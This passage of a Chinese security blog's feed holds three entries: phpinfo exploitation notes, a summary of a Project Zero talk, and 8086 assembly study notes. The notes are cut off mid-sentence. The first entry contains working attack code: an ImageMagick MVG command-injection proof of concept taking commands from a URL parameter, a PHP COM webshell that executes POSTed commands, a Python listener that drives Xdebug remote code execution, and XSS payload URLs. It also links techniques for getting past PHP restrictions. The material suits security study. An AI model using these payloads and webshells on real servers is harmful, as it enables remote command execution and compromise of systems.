PHP_SAPI == <span class="string">'cli'</span> ? $argv[<span class="number">1</span>] : $_GET[<span class="string">'cmd'</span>];</span><br><span class="line"><span class="keyword">if</span> ($command == <span class="string">''</span>) &#123;</span><br><span class="line">    $command = <span class="string">'id'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$exploit = <span class="string">&lt;&lt;&lt;EOF</span></span><br><span class="line"><span class="string">push graphic-context</span></span><br><span class="line"><span class="string">viewbox 0 0 640 480</span></span><br><span class="line"><span class="string">fill 'url(https://example.com/image.jpg"|<span class="subst">$command</span>")'</span></span><br><span class="line"><span class="string">pop graphic-context</span></span><br><span class="line"><span class="string">EOF;</span></span><br><span class="line"></span><br><span class="line">file_put_contents(<span class="string">"KKKK.mvg"</span>, $exploit);</span><br><span class="line">$thumb = <span class="keyword">new</span> Imagick();</span><br><span class="line">$thumb-&gt;readImage(<span class="string">'KKKK.mvg'</span>);</span><br><span class="line">$thumb-&gt;writeImage(<span class="string">'KKKK.png'</span>);</span><br><span class="line">$thumb-&gt;clear();</span><br><span class="line">$thumb-&gt;destroy();</span><br><span class="line">unlink(<span class="string">"KKKK.mvg"</span>);</span><br><span class="line">unlink(<span class="string">"KKKK.png"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://www.waitalone.cn/wp-content/uploads/2016/05/20160510040129174.jpg" alt="image"></p><p>3.<a href="http://www.vuln.cn/6784" target="_blank" rel="noopener">利用环境变量LD_PRELOAD来绕过php disable_function</a></p><p>4.利用扩展库绕过</p><p><strong>Windows靠系统组件</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$command=$_POST[a];</span><br><span class="line"></span><br><span class="line">$wsh = <span class="keyword">new</span> COM(<span class="string">'WScript.shell'</span>); <span class="comment">// 生成一个COM对象</span></span><br><span class="line"></span><br><span class="line">$exec = $wsh-&gt;exec(<span class="string">'cmd.exe /c '</span>.$command);  <span class="comment">//调用对象方法来执行命令</span></span><br><span class="line"></span><br><span class="line">$stdout = $exec-&gt;StdOut();</span><br><span class="line"></span><br><span class="line">$stroutput = $stdout-&gt;ReadAll();</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> $stroutput</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>Linux下可通过编译拓展库进行绕过</strong></p><p><a href="http://www.91ri.org/8700.html" target="_blank" rel="noopener">Webshell下命令执行限制及绕过方法</a></p><h3 id="enable-dl"><a href="#enable-dl" class="headerlink" title="enable_dl"></a>enable_dl</h3><p><img src="http://mdpicture.oss-cn-beijing.aliyuncs.com///171025/8k74AiDbJ9.png" alt="image"><br>上面说的利用扩展库绕过disable_functions，需要使用dl()并且开启这个选项</p><h3 id="magic-quotes-gpc"><a href="#magic-quotes-gpc" class="headerlink" title="magic_quotes_gpc"></a>magic_quotes_gpc</h3><p><img src="http://mdpicture.oss-cn-beijing.aliyuncs.com///171025/F7eC27jdDE.png" alt="image"><br>它是用来实现addslshes()和stripslashes()这两个功能的，对SQL注入进行防御。</p><h3 id="open-basedir"><a href="#open-basedir" class="headerlink" title="open_basedir"></a>open_basedir</h3><p><img src="http://mdpicture.oss-cn-beijing.aliyuncs.com///171025/cD2e9khHfH.png" alt="image"><br>这个参数将用户可操作的文件限制在某目录下，但是这个限制是可以绕过的。</p><p><a href="https://www.leavesongs.com/PHP/php-bypass-open-basedir-list-directory.html" target="_blank" rel="noopener">PHP绕过open_basedir列目录的研究</a></p><p><a href="https://www.leavesongs.com/bypass-open-basedir-readfile.html" target="_blank" rel="noopener">php5全版本绕过open_basedir读文件脚本</a></p><p><a href="https://blog.csdn.net/niexinming/article/details/53146095" target="_blank" rel="noopener">绕过open_basedir读文件脚本</a></p><h2 id="0x03扩展"><a href="#0x03扩展" class="headerlink" title="0x03扩展"></a>0x03扩展</h2><h3 id="imagick"><a href="#imagick" class="headerlink" title="imagick"></a>imagick</h3><p>前段时间影响比较大的漏洞，注意看版本。</p><p>漏洞影响ImageMagick 6.9.3-10之前的版本，包括ubuntu源中安装的ImageMagick。</p><p><a href="http://blog.topsec.com.cn/ad_lab/imagemagick-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E5%8F%8A%E5%88%86%E6%9E%90/" target="_blank" rel="noopener">ImageMagick 漏洞利用方式及分析</a></p><p><a href="http://www.jianshu.com/p/502e39c122e6" target="_blank" rel="noopener">ImageMagick远程执行漏洞分析及利用</a></p><h3 id="libxml"><a href="#libxml" class="headerlink" title="libxml"></a>libxml</h3><p>libxml 2.9以前的版本默认支持并开启了外部实体的引用，服务端解析用户提交的 xml 文件时未对 xml 文件引用的外部实体（含外部普通实体和外部参数实体）做合适的处理，会导致XXE。</p><h3 id="memcache"><a href="#memcache" class="headerlink" title="memcache"></a>memcache</h3><p><a href="http://blog.nsfocus.net/memcache-unauthorized-access-exploit/" target="_blank" rel="noopener">Memcache未授权访问漏洞利用及修复</a></p><h3 id="redis"><a href="#redis" class="headerlink" title="redis"></a>redis</h3><p><a href="https://www.leavesongs.com/PENETRATION/write-webshell-via-redis-server.html" target="_blank" rel="noopener">利用redis写webshell</a></p><h3 id="session"><a href="#session" class="headerlink" title="session"></a>session</h3><p>1.序列化的一些问题<br><img src="http://mdpicture.oss-cn-beijing.aliyuncs.com///170912/7g4402ghe1.png" alt="image"><br>序列化处理器不一致导致对象注入</p><p>当一个上传在处理中，同时POST一个与INI中设置的session.upload_progress.name同名变量时，当PHP检测到这种POST请求时，它会在$_SESSION中添加一组数据。所以可以通过Session Upload Progress来设置session。</p><p>具体可以看另一篇文章<a href="http://seaii-blog.com/index.php/2017/09/12/70.html" target="_blank" rel="noopener">php对象注入总结</a>。</p><p>2.session.upload_progress加本地文件包含=getshell</p><p><a href="http://skysec.top/2018/04/04/amazing-phpinfo/#session-upload-progress" target="_blank" rel="noopener">http://skysec.top/2018/04/04/amazing-phpinfo/#session-upload-progress</a></p><h3 id="xdebug"><a href="#xdebug" class="headerlink" title="xdebug"></a>xdebug</h3><p>xdebug命令执行</p><p><a href="https://paper.seebug.org/397/" target="_blank" rel="noopener">Xdebug: A Tiny Attack Surface</a></p><p><a href="https://paper.seebug.org/668/" target="_blank" rel="noopener">Xdebug 攻击面在 PhpStorm 上的现实利用</a></p><p><a href="http://skysec.top/2018/04/04/amazing-phpinfo/#Xdebug" target="_blank" rel="noopener">http://skysec.top/2018/04/04/amazing-phpinfo/#Xdebug</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python2</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">ip_port = (<span class="string">'0.0.0.0'</span>,<span class="number">9000</span>)</span><br><span class="line">sk = socket.socket()</span><br><span class="line">sk.bind(ip_port)</span><br><span class="line">sk.listen(<span class="number">10</span>)</span><br><span class="line">conn, addr = sk.accept()</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    client_data = conn.recv(<span class="number">1024</span>)</span><br><span class="line">    print(client_data)</span><br><span class="line"></span><br><span class="line">    data = raw_input(<span class="string">'&gt;&gt; '</span>)</span><br><span class="line">    conn.sendall(<span class="string">'eval -i 1 -- %s\x00'</span> % data.encode(<span class="string">'base64'</span>))</span><br></pre></td></tr></table></figure><h3 id="GOPHER"><a href="#GOPHER" class="headerlink" title="GOPHER"></a>GOPHER</h3><p>主要在ssrf中使用</p><p><a href="https://blog.chaitin.cn/gopher-attack-surfaces/" target="_blank" rel="noopener">利用 Gopher 协议拓展攻击面</a></p><h3 id="fastcgi"><a href="#fastcgi" class="headerlink" title="fastcgi"></a>fastcgi</h3><p><a href="https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html" target="_blank" rel="noopener">Fastcgi协议分析 &amp;&amp; PHP-FPM未授权访问漏洞 &amp;&amp; Exp编写</a></p><h2 id="0x04其它"><a href="#0x04其它" class="headerlink" title="0x04其它"></a>0x04其它</h2><h3 id="OPCACHE"><a href="#OPCACHE" class="headerlink" title="OPCACHE"></a>OPCACHE</h3><p>php不存在缓存文件，但是其有opcache，如果有文件上传就可以进行覆盖并getshell</p><h3 id="‘act-’问题"><a href="#‘act-’问题" class="headerlink" title="‘act=’问题"></a>‘act=’问题</h3><p>测试版本：PHP Version 5.6.22:<br>发掘方法：右键源代码搜索：act= </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http-sql-inject：http://target/phpinfo.php?act=Function</span><br><span class="line">xss：http://target/phpinfo.php/&apos;&quot;/&gt;&lt;script&gt;alert(1)&lt;/script&gt;</span><br><span class="line">csrf或跨域名点击劫持:http://target/phpinfo.php#bottom#fghj#dfghjk </span><br><span class="line">xss:http://target/phpinfo.php?act=rt&amp;callback=&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure><h3 id="域-amp-用户"><a href="#域-amp-用户" class="headerlink" title="域&amp;用户"></a>域&amp;用户</h3><p>phpinfo页面还能看到当前域，当前登录用户</p><p>工具</p><p><a href="https://github.com/GoSecure/php7-opcache-override" target="_blank" rel="noopener">https://github.com/GoSecure/php7-opcache-override</a></p><p>参考</p><p><a href="http://skysec.top/2018/04/04/amazing-phpinfo/#OPCACHE" target="_blank" rel="noopener">http://skysec.top/2018/04/04/amazing-phpinfo/#OPCACHE</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-基本信息&quot;&gt;&lt;a href=&quot;#0x00-基本信息&quot; class=&quot;headerlink&quot; title=&quot;0x00 基本信息&quot;&gt;&lt;/a&gt;0x00 基本信息&lt;/h2&gt;&lt;h3 id=&quot;system-info&quot;&gt;&lt;a href=&quot;#system-info&quot; c
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>project zero talk note</title>
    <link href="http://zer0yu.github.io/2018/11/12/pz-talk-note/"/>
    <id>http://zer0yu.github.io/2018/11/12/pz-talk-note/</id>
    <published>2018-11-11T16:11:24.000Z</published>
    <updated>2018-11-11T16:12:30.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-定位"><a href="#0x01-定位" class="headerlink" title="0x01 定位"></a>0x01 定位</h2><p>任务:让0day更难</p><p>工作:</p><ul><li>漏洞研究</li><li>exploit开发</li><li>缓解设计和审查</li></ul><h2 id="0x02-Project-Zero如何找bug"><a href="#0x02-Project-Zero如何找bug" class="headerlink" title="0x02 Project Zero如何找bug"></a>0x02 Project Zero如何找bug</h2><h3 id="1-我应该从哪儿找？"><a href="#1-我应该从哪儿找？" class="headerlink" title="1.我应该从哪儿找？"></a>1.我应该从哪儿找？</h3><ul><li>优先级。 攻击者会在哪里看？重视单个研究人员的经验+专业知识</li><li>找到新的攻击面，或迭代已知的攻击面。</li></ul><h3 id="2-我应该怎么找？-也就是怎么找到一个切入角度"><a href="#2-我应该怎么找？-也就是怎么找到一个切入角度" class="headerlink" title="2.我应该怎么找？  也就是怎么找到一个切入角度"></a>2.我应该怎么找？  也就是怎么找到一个切入角度</h3><ul><li>选择处理不可信数据的输入点并找到其bugs。</li><li>选择一个bug类来查找实例。</li><li>选择一个功能/规范，找出不同实现中的常见缺陷。</li><li>查找已知问题的变形。</li></ul><h3 id="3-CVE-2018-10751"><a href="#3-CVE-2018-10751" class="headerlink" title="3.CVE-2018-10751"></a>3.CVE-2018-10751</h3><ul><li>三星Galaxy S7 Edge中的OMACP溢出–由短信触发</li><li>通过寻找处理SMS的Intent找到</li><li>一年前，Contextis报道了一个类似的错误</li></ul><h3 id="4-Fuzzing"><a href="#4-Fuzzing" class="headerlink" title="4.Fuzzing"></a>4.Fuzzing</h3><p>Canonical mutation fuzzing(大概意思是利用经典数据的变种来进行fuzz)：语料库创建，参数优化，模糊测试，覆盖反馈，崩溃分析。</p><p>自定义模糊测试，如定制生成器或文件格式突变感知。</p><h3 id="5-手动审查"><a href="#5-手动审查" class="headerlink" title="5.手动审查"></a>5.手动审查</h3><p>有时是线性的：枚举函数列表并前向分析。</p><p>有时横向：找到一些脆弱属性的实例（错误类，重复错误，非标准模式），稍后建立“触发点”。</p><h2 id="0x03-对未来的预测"><a href="#0x03-对未来的预测" class="headerlink" title="0x03 对未来的预测"></a>0x03 对未来的预测</h2><ol><li>手动分析方式不会改变</li><li>基本模糊测试结果不会很好</li><li>代码覆盖率反语料库推动新工作</li><li>静态分析对VR来说效率仍然不高</li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x01-定位&quot;&gt;&lt;a href=&quot;#0x01-定位&quot; class=&quot;headerlink&quot; title=&quot;0x01 定位&quot;&gt;&lt;/a&gt;0x01 定位&lt;/h2&gt;&lt;p&gt;任务:让0day更难&lt;/p&gt;
&lt;p&gt;工作:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;漏洞研究&lt;/li&gt;
&lt;li&gt;e
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>汇编笔记</title>
    <link href="http://zer0yu.github.io/2018/11/11/assembly-note/"/>
    <id>http://zer0yu.github.io/2018/11/11/assembly-note/</id>
    <published>2018-11-11T15:18:41.000Z</published>
    <updated>2018-11-11T15:20:35.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="一、基础概念"><a href="#一、基础概念" class="headerlink" title="一、基础概念"></a>一、基础概念</h2><h3 id="0-汇编基础"><a href="#0-汇编基础" class="headerlink" title="0.汇编基础"></a>0.汇编基础</h3><p>能够被计算机直接识别的语言称之为机器语言，比如:<code>00100000</code>这种的，汇编语言是需要通过编译器转变为机器语言的。</p><p>计算机构成:输入/输出设备、存储器、运算器、控制器</p><h3 id="1-基础单位信息"><a href="#1-基础单位信息" class="headerlink" title="1.基础单位信息"></a>1.基础单位信息</h3><p>bit=位 1/0 计算机最小信息单位</p><p>Byte=字节=8bit=B=1个存储单元 计算机最小存储单位</p><p>字(word)=2B=2byte </p><p>存储地址和存储内容一般用16进制表示</p><p>0x..或者H=十六进制(0,F)  B=二进制(0,1) D=十进制(0,9)</p><h3 id="2-CPU对存储器的读写"><a href="#2-CPU对存储器的读写" class="headerlink" title="2.CPU对存储器的读写"></a>2.CPU对存储器的读写</h3><p>ROM=&gt;BOIS芯片</p><p>CPU通过地址总线寻址、数据总线传输数据、控制总线进行操作来完成一些处理。</p><p>地址对应的是数据，因此地址总线的宽度也就是其一次最大能寻找到多少个字节的数据。</p><p>不同CPU的寄存器个数是不同的，但是都有通用寄存器</p><h3 id="3-寄存器"><a href="#3-寄存器" class="headerlink" title="3.寄存器"></a>3.寄存器</h3><p>概念:CPU中程序员可以用指令读写的部件，寄存器数量有限(8086中有14个寄存器)，读写速度快。</p><p><a href="https://i.loli.net/2018/11/08/5be4379b4ae5f.png" target="_blank" rel="noopener"><img src="https://i.loli.net/2018/11/08/5be4379b4ae5f.png" alt="屏幕快照 2018-11-08 下午9.17.52.png"></a></p><p>内存单元是一个单元存放一个字节(8位二进制)</p><blockquote><p>通用寄存器可用于传送和暂存数据，也可参与算术逻辑运算，并保存运算结果。除此之外，它们还各自具有一些特殊功能。</p></blockquote><p>数据是不能直接送入段地址寄存器(DS)中的;</p><p>16位寄存器可以拆分为两个8位寄存器进行使用;</p><p><code>mov a1,[0]</code>，此处的[]说明操作的是一个内存单元，[0]中的0说明这个内存单元的偏移地址是0，它的段地址默认放在ds寄存器中，使用时会被去出来。</p><p>PS:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">累加寄存器在不同位计算机中的名字不同</span><br><span class="line">16位-AX</span><br><span class="line">32位-EAX</span><br><span class="line">64位-RAX</span><br></pre></td></tr></table></figure><p>16位数据寄存器不能存放数据地址，但是32位的可以</p><h5 id="3-1-数据寄存器"><a href="#3-1-数据寄存器" class="headerlink" title="3.1 数据寄存器"></a>3.1 数据寄存器</h5><p><a href="https://i.loli.net/2018/11/08/5be4384f283cd.png" target="_blank" rel="noopener"><img src="https://i.loli.net/2018/11/08/5be4384f283cd.png" alt="屏幕快照 2018-11-08 下午9.21.03.png"></a></p><h5 id="3-2-标志寄存器"><a href="#3-2-标志寄存器" class="headerlink" title="3.2 标志寄存器"></a>3.2 标志寄存器</h5><p><a href="https://i.loli.net/2018/11/09/5be59269c31cf.png" target="_blank" rel="noopener"><img src="https://i.loli.net/2018/11/09/5be59269c31cf.png" alt="屏幕快照 2018-11-09 下午8.54.44.png"></a></p><h6 id="3-2-1运算结果标志位"><a href="#3-2-1运算结果标志位" class="headerlink" title="3.2.1运算结果标志位"></a>3.2.1运算结果标志位</h6><p><strong>ZF标志（ZeroFlag</strong>）：</p><p>零位标志位，它记录相关指令执行后的结果是否为0，如果是0，那么ZF=1，如果结果不为0，那么ZF=0。</p><p><strong>PF标志（ParityFlag</strong>）：</p><p>奇偶标志位，它记录相关指令执行后，其结果的所有二进制位中1个个数是否为偶数，如果是偶数，PF=1，反之为0。</p><p><strong>SF标志（SignFlag</strong>）：</p><p>符号标志位，它记录相关指令执行后，其结果是否为负，如果结果为负，SF=1，如果非负，SF=0。</p><p><strong>CF标志（Carry进位，Flag标志</strong>）：</p><p>进位标志位，一般情况，进行无符号运算时，它记录运算结果的最高位向更高位的进位值，或从更高位的借位值，如果运算结果的最高位产生了一个进位或借位，那么其值为1，否则其值为0。</p><p><strong>OF标志（Overflow溢出，Flag标志）</strong>：</p><p>溢出标志位，在进行有符号数运算的时候，如果结果超出了机器所能表示的范围称为溢出，OF的值被置为1，否则OF的值为0。</p><p>注意：这里所说的溢出，只是对有符号运算而言。</p><h6 id="3-2-2状态控制标志位"><a href="#3-2-2状态控制标志位" class="headerlink" title="3.2.2状态控制标志位"></a>3.2.2状态控制标志位</h6><p><strong>TF标志（TrapFlag）</strong>：</p><p>追踪标志位，当追踪标志被置为1时，CPU进入单步执行方式，即每执行一条指令产生一个单步中断请求，这中方式主要用于程序的调试。</p><p><strong>IF标志（Interrupt-enable Flag</strong>）：</p><p>中断允许标志位，用来决定CPU是否响应CPU外部的可屏蔽中断发出的中断请求，但不管该标志为何值，CPU都必须响应CPU外部的不可屏蔽中断所发出的中断请求，以及CPU内部产生的中断请求。</p><p>当IF=1时，CPU可以相应CPU外部的可屏蔽中断发出的中断请求。</p><p>当IF=0时，CPU不响应CPU外部的可屏蔽中断发出的中断请求。</p><p>CPU的指令系统中也有专门的指令来改变标志位IF的值。</p><h3 id="4-物理地址"><a href="#4-物理地址" class="headerlink" title="4.物理地址"></a>4.物理地址</h3><p>通常文件中至少含有两个段:代码段(存储程序的指令–可读，不可写，可执行)、数据段(存储需要的数据的指令–可读，可写，可执行)</p><p>二进制左移N位相当于这个二进制数乘以2的N次方</p><p>物理地址=段地址*16(又称基址)+偏移地址</p><p>任何时刻8086CPU都会将CS:IP指向的内容作为即将执行的指令(可以使用<code>jmp</code>对其进行修改操作)</p><p>一个物理地址可以对应多个逻辑地址，在编程的时候使用的是逻辑地址(=段基地址+段内偏移地址)</p><h3 id="5-段地址"><a href="#5-段地址" class="headerlink" title="5.段地址"></a>5.段地址</h3><p><a href="https://i.loli.net/2018/11/08/5be43c4837204.png" target="_blank" rel="noopener"><img src="https://i.loli.net/2018/11/08/5be43c4837204.png" alt="屏幕快照 2018-11-08 下午9.38.04.png"></a></p><p>可以将若干地址连续的内存单元看做一个段</p><p>8086CPU有4个段寄存器，每个段寄存器用来确定一个逻辑段的起始位置，每种逻辑段均有各自的用途：</p><p> CS（代码段）：指明代码的起始地址</p><pre><code>利用CS：IP取得下一条要执行的指令</code></pre><p> SS（堆栈段）：指明堆栈段的起始地址</p><pre><code>利用SS：SP操作堆栈顶的数据</code></pre><p> DS（数据段）：指明数据的起始地址</p><pre><code>利用DS：EA存取数据段中的数据</code></pre><p> ES（附加段）：指明附加段的起始地址</p><pre><code>利用ES：EA存取附加段中的数据</code></pre><p>PS:</p><p>1.在内存中，指令和数据没有任何区别，都是而二进制信息，只是CPU将有的数据看成指令，有的看成数据</p><p>2.一般的寄存器，如AX，可以使用<code>mov ax,123</code>来完成对其中数值的修改。但是像CS,IP这样的寄存器(用来从内存中寻址执行指令的)只能使用转移指令来修改，比如jmp–<code>jum [段地址:]偏移地址</code>，段地址和’:’缺省将只修改IP的值</p><p>3.操作中如果没有指明段前缀，则一般访问的是DS</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov ax,[1000H]</span><br><span class="line">;这两行都是等价的</span><br><span class="line">mov ax,ds:[1000H]</span><br></pre></td></tr></table></figure><h3 id="6-mov-add-sub指令"><a href="#6-mov-add-sub指令" class="headerlink" title="6.mov,add,sub指令"></a>6.mov,add,sub指令</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">mov 寄存器,数据</span><br><span class="line">比如:</span><br><span class="line">mov ax,8</span><br><span class="line">mov 寄存器，寄存器</span><br><span class="line">比如:</span><br><span class="line">mov ax,bx</span><br><span class="line">mov 寄存器，内存单元</span><br><span class="line">比如:</span><br><span class="line">mov ax,[0]</span><br><span class="line">mov 内存单元，寄存器</span><br><span class="line">比如:</span><br><span class="line">mov [0],ax</span><br><span class="line">mov 段寄存器，寄存器 //相反也对</span><br><span class="line">比如:</span><br><span class="line">mov ds,ax</span><br></pre></td></tr></table></figure><p>关于mov的操作对象的说明:<br><a href="https://i.loli.net/2018/11/11/5be8064f9e0e7.png" target="_blank" rel="noopener"><img src="https://i.loli.net/2018/11/11/5be8064f9e0e7.png" alt="屏幕快照 2018-11-11 下午4.59.54.png"></a></p><p>PS:</p><p>指令=操作码(+操作数)</p><h3 id="7-栈-后入先出"><a href="#7-栈-后入先出" class="headerlink" title="7.栈(后入先出)"></a>7.栈(后入先出)</h3><p>两个关键寄存器:SS,SP-&gt;段地址,段偏移地址。这对寄存器将会指出栈顶地址。栈大小由我们自己安排所以要小心超界问题。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mov ax,0123H</span><br><span class="line">psuh ax</span><br><span class="line">mov bx,2266H</span><br><span class="line">push bx</span><br><span class="line">pop ax //2266H</span><br><span class="line">pop bx //0123H</span><br></pre></td></tr></table></figure><p>PS:</p><p>堆栈操作都是以字(2字节)为单位操作的。</p><h3 id="8-开发环境配置"><a href="#8-开发环境配置" class="headerlink" title="8.开发环境配置"></a>8.开发环境配置</h3><p>win7及以上系统都没有debug了，所以都需要这个DOSBOX</p><p><a href="https://www.cnblogs.com/skyen/p/9721471.html" target="_blank" rel="noopener">MAC OS环境下DOSBOX汇编环境的搭建</a></p><h3 id="9-debug"><a href="#9-debug" class="headerlink" title="9.debug"></a>9.debug</h3><p><strong>功能</strong>:</p><ol><li>可以查看CPU寄存器的各种内容</li><li>可以查看内存的使用情况</li><li>可以在机器码级别跟踪程序的运行</li></ol><p><strong>常用操作</strong>:<br><a href="https://i.loli.net/2018/11/08/5be44eaf49624.png" target="_blank" rel="noopener"><img src="https://i.loli.net/2018/11/08/5be44eaf49624.png" alt="屏幕快照 2018-11-08 下午10.56.20.png"></a></p><h2 id="二、程序"><a href="#二、程序" class="headerlink" title="二、程序"></a>二、程序</h2><h3 id="0-程序运行"><a href="#0-程序运行" class="headerlink" title="0.程序运行"></a>0.程序运行</h3><p>1.程序加载到内存</p><p>2.CPU使用寄存器CS:IP找到程序即将执行指令的位置</p><h3 id="1-伪指令"><a href="#1-伪指令" class="headerlink" title="1.伪指令"></a>1.伪指令</h3><p>伪指令不对应机器码，由编译器进行处理</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">// 将名字为codesg(标号   )的代码段跟cs寄存器联系起来</span><br><span class="line">assume cs:codesg</span><br><span class="line"></span><br><span class="line">// XXX segment 到 XXX ends标识了一个代码段</span><br><span class="line"></span><br><span class="line">codesg segment</span><br><span class="line"></span><br><span class="line">    mov ax,0123H</span><br><span class="line">    ...</span><br><span class="line">    // 下面这两段实现了程序返回</span><br><span class="line">    mov ax,4c00H</span><br><span class="line">    int 21H</span><br><span class="line">    </span><br><span class="line">codesg ends</span><br><span class="line"></span><br><span class="line">end // 汇编程序结束的标志</span><br></pre></td></tr></table></figure><p>将代码保存为asm格式的文件后就可以采用微软的masm汇编编译器来编译汇编代码。(注意编译后生成的是filename.obj还需要将其链接为可执行文件filename.exe，连接可以使用微软的Overlay Linker3.60连接器)</p><h6 id="2-bx-和loop指令"><a href="#2-bx-和loop指令" class="headerlink" title="2.[bx]和loop指令"></a>2.[bx]和loop指令</h6><p><code>mov ax,[bx]</code><br>功能:bx中存放的数据作为一个偏移地址EA,段地址SA默认在ds中，将SE:EA处的数据送入ax中，即(ax)=((ds)*16+(dx))</p><p><code>inc bx</code> 是指bx中的内容加1</p><p>PS:用’()’来表示一个寄存器或者内存单元中的内容。比如(ax)就表示寄存器ax中的内容</p><p>loop指令实现循环公布功能,cx中保存了循环次数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">assume cs:codesg</span><br><span class="line"></span><br><span class="line">codesg segment</span><br><span class="line"></span><br><span class="line">    mov ax,0123H</span><br><span class="line">    mov cx,11</span><br><span class="line">    // s是一个标号</span><br><span class="line">    // 只要cx中的值不为0，则loop都回去执行标号s出的值</span><br><span class="line">s:  add ax,ax</span><br><span class="line">    loop s</span><br><span class="line">    mov ax,4c00H</span><br><span class="line">    int 21H</span><br><span class="line">    </span><br><span class="line">codesg ends</span><br><span class="line"></span><br><span class="line">end</span><br></pre></td></tr></table></figure><h6 id="3-dw和end"><a href="#3-dw和end" class="headerlink" title="3.dw和end"></a>3.dw和end</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">assume cs:codesg</span><br><span class="line"></span><br><span class="line">codesg segment</span><br><span class="line"></span><br><span class="line">        dw 0123h,0456h,0789h,0defh</span><br><span class="line">start:  mov ax,0123H</span><br><span class="line">        mov cx,11</span><br><span class="line">        // s是一个标号</span><br><span class="line">        // 只要cx中的值不为0，则loop都回去执行标号s出的值</span><br><span class="line">s:      add ax,ax</span><br><span class="line">        loop s</span><br><span class="line">        mov ax,4c00H</span><br><span class="line">        int 21H</span><br><span class="line">    </span><br><span class="line">codesg ends</span><br><span class="line"></span><br><span class="line">end start</span><br></pre></td></tr></table></figure><p><code>dw</code>定义了多个字符型数据，每个数据占用16个字节的内存空间。取用时从cs去的段地址，<code>dw</code>最先定义所以段偏移为0，之后bx加2操作进行连续取用。</p><p><code>end</code>除了通知编译器程序结束外，还可以告诉编译器程序的入口在什么地方。</p><h2 id="三、更灵活的定位内存地址的方法"><a href="#三、更灵活的定位内存地址的方法" class="headerlink" title="三、更灵活的定位内存地址的方法"></a>三、更灵活的定位内存地址的方法</h2><h3 id="0-七种寻址方式"><a href="#0-七种寻址方式" class="headerlink" title="0.七种寻址方式"></a>0.七种寻址方式</h3><p>寻址方式: 指令中指明操作数存放位置的表达方式。</p><p>寻址方式可以分为:</p><pre><code>立即数寻址方式(存放在指令当中)mov 